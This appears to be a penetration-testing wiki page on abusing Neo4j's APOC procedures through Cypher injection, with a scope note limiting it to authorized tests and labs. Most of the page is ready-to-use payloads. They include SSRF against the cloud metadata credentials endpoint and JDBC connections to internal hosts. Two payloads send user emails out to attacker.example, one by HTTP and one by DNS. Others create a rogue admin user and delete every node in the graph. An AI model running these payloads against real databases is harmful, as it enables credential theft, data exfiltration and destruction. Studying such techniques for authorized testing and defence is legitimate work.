---
title: "APOC procedure abuse through Cypher injection in Neo4j"
description: "Reaching APOC procedures via CALL injection turns a Cypher flaw into SSRF, outbound exfiltration, and command execution on Neo4j."
keywords:
  - APOC abuse
  - Neo4j CALL injection
  - apoc.load.json SSRF
  - apoc.load.jdbc
  - Cypher exfiltration
  - command execution
---

# APOC procedure abuse

APOC ("Awesome Procedures On Cypher") is a widely installed Neo4j extension library. Many deployments enable it for data loading and integration, which means a Cypher injection that can reach a `CALL` clause (see [Cypher injection](cypher-injection.md)) often reaches APOC. These procedures make outbound requests, read and write files, run other Cypher, and on some configurations execute operating-system commands, turning a read-only query flaw into SSRF, exfiltration, and code execution.

> **Scope.** For authorized penetration tests, CTF labs, and code review of systems you own or are contracted to assess.

## Reaching CALL from an injection point

Close the literal, discard the tail, and append `CALL`:

```
' CALL apoc.help('apoc') YIELD name RETURN name //
```

`apoc.help` enumerates which APOC procedures are present, so it is a useful first probe for what the target allows.

## SSRF and outbound requests

`apoc.load.json` and `apoc.load.jsonParams` fetch a URL from inside the database. Pointed at internal hosts or cloud metadata, this is server-side request forgery from the database tier:

```
' CALL apoc.load.json('http://169.254.169.254/latest/meta-data/iam/security-credentials/') YIELD value RETURN value //
' CALL apoc.load.json('http://internal-admin.local/') YIELD value RETURN value //
```

`apoc.load.jdbc` opens a JDBC connection to an arbitrary connection string, reaching internal databases or, with a crafted URL, driver-specific behaviors:

```
' CALL apoc.load.jdbc('jdbc:postgresql://10.0.0.5/app?user=postgres','SELECT version()') YIELD row RETURN row //
```

## Outbound exfiltration

The same request procedures carry data out. Fold extracted graph contents into the request so the response (or a controlled listener) receives them:

```
' WITH 1 AS x MATCH (u:User)
  WITH collect(u.email) AS data
  CALL apoc.load.jsonParams('http://attacker.example/x', {}, apoc.convert.toJson(data)) YIELD value
  RETURN value //
```

Where DNS is the only egress, encode data into a hostname and resolve it:

```
' CALL apoc.load.json('http://'+apoc.convert.toJson(1)+'.attacker.example/') YIELD value RETURN value //
```

`apoc.export.csv.*` / `apoc.export.json.*` write query results to a file where file export is enabled, useful when a writable path is served or later retrieved.

## Running more Cypher

`apoc.cypher.run`, `apoc.cypher.runMany`, and `apoc.cypher.doIt` execute a Cypher string. `doIt` runs write operations even inside an otherwise read context, so a read-only injection point can escalate to writes:

```
' CALL apoc.cypher.doIt('CREATE (:User {name:\'pwn\', role:\'admin\'})', {}) YIELD value RETURN value //
' CALL apoc.cypher.runMany('MATCH (n) DETACH DELETE n', {}) YIELD result RETURN result //
```

Because these take the sub-query as a string, they also help evade filters that inspect only the outer statement.

## Command execution

Some environments load extensions that run system commands, for example `apoc.util` helpers or custom procedures. Where a command-running procedure is present and permitted, injection reaches OS execution in the database service account:

```
' CALL apoc.systemdb.execute('...') //
```

Enumerate first with `apoc.help('apoc')` and `dbms.procedures()` (or `SHOW PROCEDURES` on newer versions) to learn exactly which callable surfaces exist before attempting execution:

```
' CALL dbms.procedures() YIELD name, signature RETURN name, signature //
```

## References

- [APOC: load.json / load.jsonParams](https://neo4j.com/labs/apoc/current/import/load-json/)
- [APOC: load.jdbc](https://neo4j.com/labs/apoc/current/database-integration/load-jdbc/)
- [APOC: apoc.cypher.* procedures](https://neo4j.com/labs/apoc/current/cypher-execution/)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
